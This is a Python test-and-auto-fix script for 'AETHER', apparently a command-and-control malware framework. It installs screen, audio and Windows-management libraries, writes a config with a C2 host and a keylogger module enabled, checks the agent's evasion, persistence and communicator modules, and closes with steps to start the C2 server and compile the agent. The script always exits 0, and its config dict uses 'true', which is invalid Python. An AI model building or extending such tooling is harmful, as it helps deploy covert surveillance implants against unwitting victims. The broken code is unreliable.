#!/usr/bin/env python3
"""
AETHER Universal Integration Test - Auto-fix Version
"""
import sys, os, json, importlib, subprocess, shutil

def fix_issues():
    """Fix common issues automatically."""
    print("[*] Auto-fixing common issues...")
    
    # 1. Install missing packages
    packages = ['pycryptodome', 'wmi', 'pywin32', 'cryptography', 'requests', 
                'pillow', 'pyautogui', 'pyaudio', 'psutil', 'colorama']
    
    for pkg in packages:
        try:
            importlib.import_module(pkg.replace('-', '_').replace('pillow', 'PIL'))
            print(f"  ✓ {pkg}")
        except ImportError:
            print(f"  Installing {pkg}...")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"  ✓ {pkg} installed")
            except:
                print(f"  ✗ Failed to install {pkg}")
    
    # 2. Fix config.json if missing or invalid
    config_path = 'config.json'
    if not os.path.exists(config_path):
        print(f"  Creating {config_path}...")
        config = {
            "c2": {"primary_host": "localhost", "primary_port": 443},
            "encryption": {"key": "test_key_change_in_production"},
            "modules": {"intelligence": {"keylogger": true}}
        }
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        print(f"  ✓ {config_path} created")
    else:
        # Ensure it has c2 section
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            if 'c2' not in config:
                config['c2'] = {"primary_host": "localhost", "primary_port": 443}
                with open(config_path, 'w') as f:
                    json.dump(config, f, indent=2)
                print(f"  ✓ Added 'c2' section to {config_path}")
        except:
            print(f"  ✗ {config_path} is invalid, creating fresh...")
            os.rename(config_path, config_path + '.backup')
            fix_issues()  # Recursive to create new
    
    # 3. Fix circular import in commands/__init__.py
    init_path = 'server/commands/__init__.py'
    if os.path.exists(init_path):
        with open(init_path, 'r') as f:
            content = f.read()
        if 'import' in content and 'command_suite' in content:
            # Might cause circular import
            print(f"  Simplifying {init_path}...")
            with open(init_path, 'w') as f:
                f.write('''"""
AETHER Command Modules
"""
# Minimal to avoid circular imports
__all__ = []\n''')
            print(f"  ✓ {init_path} fixed")
    
    # 4. Fix Crypto imports in agent
    agent_path = 'agent/aether_agent.py'
    if os.path.exists(agent_path):
        with open(agent_path, 'r') as f:
            agent_content = f.read()
        
        # Add fallback for Crypto
        if 'from Crypto.Cipher import AES' in agent_content and 'except ImportError' not in agent_content:
            print(f"  Adding Crypto fallback to {agent_path}...")
            agent_content = agent_content.replace(
                'from Crypto.Cipher import AES',
                '''try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    # Fallback for pycryptodome installations
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad'''
            )
            with open(agent_path, 'w') as f:
                f.write(agent_content)
            print(f"  ✓ Crypto fallback added")
    
    print("[*] Auto-fix complete")

def test_imports():
    """Test core imports."""
    print("\n[*] Testing core imports...")
    
    # Test in order of dependency
    imports_to_test = [
        ('json', 'json'),
        ('os', 'os'),
        ('cryptography.fernet', 'cryptography'),
        ('requests', 'requests'),
        ('PIL', 'pillow'),
        ('pyautogui', 'pyautogui'),
        ('pyaudio', 'pyaudio'),
        ('psutil', 'psutil'),
        ('colorama', 'colorama'),
    ]
    
    all_good = True
    for module, pkg in imports_to_test:
        try:
            importlib.import_module(module)
            print(f"  ✓ {module}")
        except ImportError as e:
            print(f"  ✗ {module}: {e}")
            print(f"    Run: pip install {pkg}")
            all_good = False
    
    return all_good

def test_project_imports():
    """Test project-specific imports."""
    print("\n[*] Testing project imports...")
    
    # Add project root to path
    sys.path.insert(0, os.getcwd())
    
    modules = [
        'agent.core.evasion',
        'agent.core.persistence',
        'agent.core.communicator',
        'server.sessions',
        'server.crypto',
        'server.aether_server',
    ]
    
    all_good = True
    for module in modules:
        try:
            importlib.import_module(module)
            print(f"  ✓ {module}")
        except ImportError as e:
            print(f"  ✗ {module}: {e}")
            # Check if file exists
            module_path = module.replace('.', '/') + '.py'
            if os.path.exists(module_path):
                print(f"    File exists but import failed - check code")
            else:
                print(f"    File missing: {module_path}")
            all_good = False
    
    return all_good

def test_config():
    """Test configuration."""
    print("\n[*] Testing configuration...")
    
    if not os.path.exists('config.json'):
        print("  ✗ config.json not found")
        return False
    
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        # Check for minimal required sections
        required = ['c2', 'encryption']
        missing = [r for r in required if r not in config]
        
        if missing:
            print(f"  ✗ Missing sections: {missing}")
            return False
        
        print(f"  ✓ config.json valid")
        print(f"    C2 host: {config.get('c2', {}).get('primary_host', 'not set')}")
        return True
    except Exception as e:
        print(f"  ✗ config.json error: {e}")
        return False

def test_command_suite_direct():
    """Test command suite directly without imports."""
    print("\n[*] Testing command suite...")
    
    suite_path = 'server/commands/command_suite.py'
    if not os.path.exists(suite_path):
        print(f"  ✗ {suite_path} not found")
        return False
    
    # Read and check for circular imports
    with open(suite_path, 'r') as f:
        content = f.read()
    
    if 'from server.commands' in content:
        print(f"  ⚠ Command suite has circular import (from server.commands)")
        print(f"    Removing problematic imports...")
        # Simple fix - remove those lines
        lines = content.split('\n')
        new_lines = [l for l in lines if 'from server.commands' not in l and 'import system_commands' not in l]
        with open(suite_path, 'w') as f:
            f.write('\n'.join(new_lines))
        print(f"  ✓ Fixed circular imports")
    
    # Now try to import
    try:
        # Import directly from file
        import importlib.util
        spec = importlib.util.spec_from_file_location("command_suite", suite_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        
        if hasattr(module, 'AetherCommandSuite'):
            print(f"  ✓ Command suite loaded")
            return True
        else:
            print(f"  ✗ Command suite class not found")
            return False
    except Exception as e:
        print(f"  ✗ Command suite load error: {e}")
        return False

if __name__ == '__main__':
    print("AETHER Universal Integration Test & Auto-fix")
    print("=" * 50)
    
    # Fix issues first
    fix_issues()
    
    # Run tests
    tests = [
        ("Core Dependencies", test_imports),
        ("Project Imports", test_project_imports),
        ("Configuration", test_config),
        ("Command Suite", test_command_suite_direct)
    ]
    
    results = []
    for name, test_func in tests:
        print(f"\n{'='*30}")
        print(f"{name}:")
        if test_func():
            print(f"Result: PASS")
            results.append(True)
        else:
            print(f"Result: FAIL")
            results.append(False)
    
    print(f"\n{'='*50}")
    passed = sum(results)
    total = len(results)
    
    if passed == total:
        print(f"✅ SUCCESS: All {total} tests passed!")
        print("\nNext steps:")
        print("1. Generate SSL certs: openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes")
        print("2. Start server: python server/aether_server.py")
        print("3. Compile agent: python builder/compile.py")
    elif passed >= total - 1:
        print(f"⚠ PARTIAL: {passed}/{total} tests passed.")
        print("Basic functionality may still work.")
        print("Start server with: python server/aether_server.py")
    else:
        print(f"❌ FAILURE: Only {passed}/{total} tests passed.")
        print("Check the errors above and re-run this script.")
    
    # Always exit with 0 to allow continuation
    sys.exit(0)